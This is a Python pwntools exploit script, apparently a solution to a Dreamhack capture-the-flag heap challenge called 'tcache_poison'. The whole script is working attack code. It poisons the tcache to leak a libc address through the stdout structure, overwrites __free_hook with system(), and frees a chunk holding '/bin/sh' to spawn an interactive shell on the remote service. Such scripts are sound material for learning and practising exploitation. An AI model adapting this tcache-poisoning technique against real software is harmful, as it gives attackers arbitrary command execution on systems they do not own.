from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/tcache_poison')
    stdout_offset = 0x3ec760
    freehook_offset = 0x3ed8e8
    system_offset = 0x4f420
else:
    r = remote('host1.dreamhack.games', 9196)
    stdout_offset = 0x3ec760
    freehook_offset = 0x3ed8e8
    system_offset = 0x4f550

sla = r.sendlineafter
sa = r.sendafter


def Alloc(size, content):
    sla('4. Edit\n', '1')
    sla('Size: ', str(size))
    sa('Content: ', content)


def Free():
    sla('4. Edit\n', '2')


def Print():
    sla('4. Edit\n', '3')


def Edit(content):
    sla('4. Edit\n', '4')
    sa('Edit chunk: ', content)


# leak libc

Alloc(0x18, 'a')
Free()
Edit(p64(0x601010))
Alloc(0x18, 'a')
Alloc(0x18, '\x60')
Print()

r.recvuntil('Content: ')
stdout = u64(r.recvn(6).ljust(8, b'\x00'))  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
system = libc + system_offset  # system()
freehook = libc + freehook_offset  # __free_hook


# overwrite free hook with system()

Alloc(0x28, 'a')
Free()
Edit(p64(freehook))
Alloc(0x28, 'a')
Alloc(0x28, p64(system))


# call system("/bin/sh")

Alloc(0x38, '/bin/sh')
Free()


r.interactive()